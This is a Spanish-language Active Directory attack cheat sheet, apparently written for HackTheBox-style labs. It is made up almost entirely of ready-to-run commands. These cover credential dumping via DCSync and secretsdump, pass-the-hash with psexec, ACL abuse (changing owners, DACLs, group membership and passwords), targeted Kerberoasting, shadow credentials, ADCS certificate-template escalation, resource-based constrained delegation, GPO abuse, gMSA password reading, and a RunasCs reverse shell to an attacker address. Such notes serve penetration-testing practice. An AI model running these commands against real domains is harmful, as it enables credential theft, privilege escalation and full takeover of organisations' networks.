- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
- https://github.com/puckiestyle/powershell
```bash
.\Sharphound.exe --ldapusername 'pepe' --ldappassword 'Test!'
```

- Limpiar
```bash
127.0.0.1:8080/api/v2/clear-database
```
- SI no arranca
```bash
sudo systemctl enable postgresql

sudo systemctl start postgresql

sudo systemctl status postgresql
```

- Config
```bash
update-alternatives --config java #opcion 1

neo4j console &> /dev/null & disown

bloodhound &> /dev/null& disown 
```

- Extraccion de json
- Pon el dominio no el del SERVER PRINCIPAL
```bash
bloodhound-python -u "svc_loanmgr" -p 'Moneymakestheworldgoround!' -c All --zip -ns 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL
```
- Si falla, añadele el DC por separado

```bash
bloodhound-python -u "f.frizzle" -p 'Jenni_Luvs_Magic23' -c All --zip -ns 10.10.11.60 -d frizz.htb -dc frizzdc.frizz.htb
```
- Subes el zip
- si no tienes contraseña
```bash
bloodhound-python -u "svc_loanmgr" --no-pass -k -c All --zip -ns 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL
```

## Hacer dcsync

- Encontramos un `GetChangesAll` o algo asi
```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/SVC_LOANMGR@10.10.10.175

impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e

rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```


## Añadir usuario a un grupo

```bash
bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb \
                -u 'web_svc' -p 'dksehdgh712!@#' \
                add groupMember IT_SUPPORT web_svc
```

## Cambiar contraseña a un usuario

```bash
bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb \
                -u 'web_svc' -p 'dksehdgh712!@#' \
                set password monitoring_svc 'SuperStrongPassword!'
```

## WriteOwner

```powershell
certipy-ad find -vulnerable -username ryan -password WqSZAF6CysDQbGb3 -dc-ip 10.10.11.51 -stdout

impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3

impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"
---------------------------
net rpc password john -U 'sam' -S 10.10.11.72
```

## GenericWrite

```bash
python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.10.11.42

------------------------------

pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"

python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx 9Hdz5oWb.pfx -pfx-pass 1S3M0jt7RoI038fLn8lz certified.htb/management_svc management_svc.ccache

KRB5CCNAME=management_svc.ccache python3 /opt/PKINITtools/getnthash.py -key 4c00e2975b7003739e5763a32649067f40837c6fc2e6deff9a9b481b194c8892 -dc-ip 10.10.11.41 certified.htb/management_svc

----------------------------------
#Si no tengo user y pass
bloodyAD -d vintage.htb -k --host dc01.vintage.htb -f rc4 add groupMember 'ServiceManagers' 'GMSA01$'
#Usa la que quieras
bloodyAD -d vintage.htb -k --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$'

------------------
certipy-ad shadow auto -username p.agila -password 'prometheusx-303' -dc-ip 10.10.11.69 -account ca_svc

export KRB5CCNAME=ca_svc.ccache|certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update

certipy-ad find -vulnerable -username ca_svc -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -stdout

certipy-ad req -username ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41


```

# Kerberos

### Borrar de un grupo

```bash
bloodyAD --host dc.rustykey.htb -k -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'
```

### Añdir contraseña

```bash
bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'pa$$w0rd'
```

### Añadir  a un grupo

```bash
bloodyAD --host dc.rustykey.htb --dc-ip 10.10.11.75 -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$
```
## GenericAll

- Sobre el DC
```bash
#Descargo:
PowerView
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Powermad
https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1
Rubeus
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe

#INVOCAMOS
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1

#Escalada
New-MachineAccount -MachineAccount esteesminuevopc -Password $(ConvertTo-SecureString 'esta3sl@pass' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer esteesminuevopc -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer dc | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

.\Rubeus.exe hash /password:esta3sl@pass

```


 - Sobre un usuario
```bash
bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d vintage.htb -k add uac SVC_ARK -f DONT_REQ_PREAUTH

impacket-GetNPUsers vintage.htb/ -no-pass -usersfile users

#Activar cuenta
bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d vintage.htb -k remove uac SVC_ARK -f ACCOUNTDISABLE
---------------------------

bloodyAD --host "10.10.11.69" -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" add groupMember "Service Accounts" "p.agila"    
------------------------

bloodyAD --host [10.10.11.72](https://10.10.11.72/) -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' -d tombwatcher.htb set password sam 'Password123!'

owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher/sam:Password123!' -dc-ip [10.10.11.72](https://10.10.11.72/)

dacledit -action write -rights FullControl -principal sam -target john 'tombwatcher/sam:Password123!' -dc-ip [10.10.11.72](https://10.10.11.72/)

dacledit -action write -rights FullControl -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'NewPassword123!' -dc-ip [10.10.11.72](https://10.10.11.72/) evil-winrm -i [10.10.11.72](https://10.10.11.72/) -u john -p'NewPassword123!'

#Desde EVIL-WINRM
net user arra Testing123 /add /domain
net group "Exchange Windows Permissions" arra /add
//Subes POWERVIEW
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity arra -Rights DCSync
#Sacar claves
secretsdump.py htb.local/arra@10.10.10.161
```

## Explotacion de Templates

```bash
certipy-ad find -vulnerable -username ryan -password WqSZAF6CysDQbGb3 -dc-ip 10.10.11.51 -stdout

certipy-ad find -vulnerable -username ryan -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.51 -stdout
```

**ESC9**
- De una cuenta con GenericWrite y su hash a la cuenta mas alta que hemos comprometido y esta conectada con GenericAll 

```bash
#Repetir varias veces hasta que te de el administrator.pfx
certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator


certipy-ad req -username ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41

certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.10.11.41
```


## Importar el cache

- Para operar con permisos sobre otros grupos o usarios debemos importarnos primero el tgt de nuestro usuario
```bash
#CON HASH
impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:5008d30496b4c5069ce1fc187b5b5960

impacket-getTGT vintage.htb/L.Bianchi_adm@dc01.vintage.htb -hashes :6b751449807e0d73065b0423b64687f0

#CON PASSWD
impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01

klist
```

## ADCS Generic ALl

```bash
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

#Ulimo GUID
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

Get-ADUser -Identity cert_admin -Properties *

Enable-ADAccount -Identity cert_admin

Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Testing123" -AsPlainText -Force)

certipy-ad find -vulnerable -username cert_admin -password Testing123 -dc-ip 10.10.11.72 -stdout

certipy-ad req -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -target-ip 10.10.11.72 -u cert_admin@tombwatcher.htb -p 'Feb@2015' -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'

certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -domain tombwatcher.htb -ldap-shell

change_password administrator Testing123
```


## WriteSPN

```bash
python3 /opt/targetedKerberoast/targetedKerberoast.py -v --dc-host dc.voleur.htb -k -u svc_ldap -d voleur.htb
```


## WriteGPLink

- Subes runas y sharpgpoabuse
```bash
Get-GPO -All | select Displayname,Id

New-GPO -Name New-GPO | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

- Exploit
```bash
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName New-GPO --force

gpupdate.exe /force
```

- Nos mandamos revershell
```bash
#Cambiar a cmd.exe si no
.\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' powershell.exe -r 10.10.14.14:1234
```

## Cambair creds

```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set password javier.mmarshall 'Password123@'
```


## ForceChangePassword

- Usar ultima version de bloody

```bash
python3 /opt/bloodyAD/bloodyAD.py --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set object javier.mmarshall userAccountControl -v 512

python3 /opt/bloodyAD/bloodyAD.py --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set object javier.mmarshall logonHours

python3 /opt/bloodyAD/bloodyAD.py --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set password javier.mmarshall 'Password123@'
```

## GMSA PASSWORDS

```bash
python3 /opt/bloodyAD/bloodyAD.py -k --host dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'Password123@' get object 'Mirage-Service$' --attr msDS-ManagedPassword
```

## Restaurar Usuarios

- Si somos de un grupo de restore

```bash
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
```

- Cogemos SID
```bash
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```
